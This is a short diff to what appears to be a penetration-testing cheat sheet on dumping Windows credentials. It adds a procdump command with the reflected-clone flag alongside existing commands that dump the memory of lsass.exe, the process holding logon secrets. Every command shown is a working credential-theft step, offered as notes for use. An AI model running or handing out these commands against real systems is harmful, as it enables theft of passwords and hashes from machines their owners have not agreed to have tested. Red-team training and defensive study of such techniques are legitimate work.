@@ -4,6 +4,7 @@
 - We can dump `lsass.exe` using `procdump.exe`
 ```
 procdump.exe -accepteula -ma lsass.exe lsass_dump
+procdump.exe -accepteula -r -ma lsass.exe lsass_dump
 procdump.exe (ps lsass).id data -ma
 ```
 - Also can be done using PID
